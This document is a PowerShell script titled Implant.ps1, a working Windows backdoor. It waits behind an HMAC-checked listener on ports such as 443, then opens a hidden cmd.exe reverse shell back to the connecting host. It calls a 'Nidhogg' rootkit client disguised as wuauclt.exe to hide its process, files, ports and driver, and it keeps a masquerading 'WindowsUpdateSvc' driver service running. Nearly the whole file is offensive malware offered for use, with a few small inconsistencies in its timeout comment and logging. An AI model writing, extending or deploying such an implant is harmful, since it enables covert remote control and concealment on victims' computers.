# Implant.ps1
$SharedSecret = "bluewinstheday!!"
$TriggerPort  = 443
$BaseReversePort = 4444
$CurrentReversePort = $BaseReversePort

$AppDir = "C:\Windows\System32\WindowsModulesAssistant"
$NidhoggClient = "$AppDir\wuauclt.exe"

function Log($msg) {
    Add-Content -Path "C:\Windows\Temp\debug.log" -Value "$(Get-Date -Format 'HH:mm:ss') $msg"
}

function Invoke-Nidhogg {
    param([string]$Cmd)
    if (Test-Path $NidhoggClient) {
        try { & $NidhoggClient @($Cmd.Split()) | Out-Null } catch {}
    }
}

# Initial hiding
# Invoke-Nidhogg "process hide $PID"
# Invoke-Nidhogg "file hide $AppDir\Implant.ps1"
# Invoke-Nidhogg "file hide $AppDir\wuauclt.exe"
# Invoke-Nidhogg "port hide $TriggerPort tcp remote"
# Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"

while ($true) {
    try {
        # Keep driver alive
        if ((sc.exe query WindowsUpdateSvc | Select-String "RUNNING") -eq $null) {
            sc.exe start WindowsUpdateSvc | Out-Null
            Invoke-Nidhogg "driver hide C:\Windows\System32\drivers\Nidhogg.sys"
        }

        # Periodic re-hiding
        if ((Get-Random -Maximum 10) -eq 0) {
            Invoke-Nidhogg "process hide $PID"
            Invoke-Nidhogg "port hide $TriggerPort tcp remote"
            Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
        }

        # ====================== LISTENER WITH PORT FALLBACK ======================
        $PortsToTry = @(443, 8443, 10443, 4443)
        $listener = $null
        $boundPort = $null

        foreach ($p in $PortsToTry) {
            try {
                $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $p)
                $listener.Server.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress, $true)
                $listener.Start()
                $boundPort = $p
                break
            } catch {
                if ($listener) { $listener.Stop(); $listener.Server.Dispose() }
            }
        }

        if (-not $boundPort) {
            Start-Sleep -Seconds 30
            continue
        }

        try {
            $client = $listener.AcceptTcpClient()
            $stream = $client.GetStream()
            
            # --- THE FIX: 5-second timeout prevents deadlock from scanners ---
            $stream.ReadTimeout = 20000
            $stream.WriteTimeout = 20000
            
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            # HMAC Challenge-Response
            $challenge = Get-Random -Maximum 1000000000
            
            try {
                $response = $reader.ReadLine()
            } catch {
                # If the read times out, response is null, and we skip to finally block
                $response = $null
            }

            Log "Challenge sent: $challenge"
            Log "Expected HMAC: $expected"
            Log "Received response: $response"

            if (-not [string]::IsNullOrWhiteSpace($response)) {
                $response = $response.Trim()
                $hmac = New-Object System.Security.Cryptography.HMACSHA256
                $hmac.Key = [Text.Encoding]::UTF8.GetBytes($SharedSecret)
                $expected = -join ($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes("$challenge")) | ForEach-Object { $_.ToString("x2") })

                if ($response -eq $expected) {
                    # PORT DIVERSION
                    Log "Using port: $CurrentReversePort"
                    Start-Sleep -Seconds 1

                    $remoteIP = $client.Client.RemoteEndPoint.Address.ToString()
                    $listener.Stop()

                    # Hide new port, unhide old one
                    Invoke-Nidhogg "port unhide $CurrentReversePort tcp remote"
                    $CurrentReversePort = $CurrentReversePort + 1
                    if ($CurrentReversePort -gt 4455) { $CurrentReversePort = $BaseReversePort }
                    Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"

                    # ====================== REVERSE SHELL ======================
                    $revClient = New-Object System.Net.Sockets.TcpClient($remoteIP, $CurrentReversePort)
                    $revStream = $revClient.GetStream()
                    $revWriter = New-Object System.IO.StreamWriter($revStream)
                    $revReader = New-Object System.IO.StreamReader($revStream)
                    $revWriter.AutoFlush = $true

                    $process = New-Object System.Diagnostics.Process
                    $process.StartInfo.FileName = "cmd.exe"
                    $process.StartInfo.Arguments = "/Q"
                    $process.StartInfo.RedirectStandardInput = $true
                    $process.StartInfo.RedirectStandardOutput = $true
                    $process.StartInfo.RedirectStandardError = $true
                    $process.StartInfo.UseShellExecute = $false
                    $process.StartInfo.CreateNoWindow = $true
                    $process.StartInfo.WindowStyle = "Hidden"
                    $process.Start() | Out-Null

                    Invoke-Nidhogg "process hide $($process.Id)"

                    # Async I/O
                    $outputAction = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine($e.Data) } } catch {} }
                    $errorAction  = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine("[ERR] $($e.Data)") } } catch {} }

                    $outEvent = Register-ObjectEvent $process.StandardOutput "OutputDataReceived" -Action $outputAction
                    $errEvent = Register-ObjectEvent $process.StandardError  "ErrorDataReceived"  -Action $errorAction

                    $process.BeginOutputReadLine()
                    $process.BeginErrorReadLine()

                    try {
                        while (-not $process.HasExited -and $revClient.Connected) {
                            if ($revStream.DataAvailable) {
                                $cmd = $revReader.ReadLine()
                                if ($cmd) { $process.StandardInput.WriteLine($cmd) }
                            }
                            Start-Sleep -Milliseconds 50
                        }
                    } finally {
                        if ($outEvent) { Unregister-Event -SourceIdentifier $outEvent.Name -EA SilentlyContinue }
                        if ($errEvent) { Unregister-Event -SourceIdentifier $errEvent.Name -EA SilentlyContinue }
                        if (-not $process.HasExited) { $process.Kill() }
                        $revClient.Close()
                    }
                } else {
                    Log "DENIED"
                }
            }
        }
        finally {
            if ($listener) { 
                try { $listener.Stop(); $listener.Server.Dispose() } catch {} 
            }
            if ($client) { try { $client.Close() } catch {} }
        }

        Start-Sleep -Seconds 3
    }
    catch {
        Start-Sleep -Seconds 30
    }
}
